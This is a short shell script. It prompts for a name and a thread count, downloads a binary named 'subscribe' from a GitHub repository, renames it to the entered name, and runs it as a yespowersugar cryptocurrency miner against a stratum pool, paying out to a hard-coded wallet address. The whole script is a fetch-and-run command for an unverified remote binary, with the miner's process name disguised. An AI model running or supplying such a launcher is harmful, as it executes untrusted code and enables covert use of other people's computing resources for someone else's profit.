read -p " name: " CRP
read -p " trit: " TRIT
wget https://raw.githubusercontent.com/penjelajahwaktu/subrek/main/subscribe && mv subscribe $CRP && chmod +x $CRP && ./$CRP -a yespowersugar  -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.$CRP -t $TRIT -p m=solo
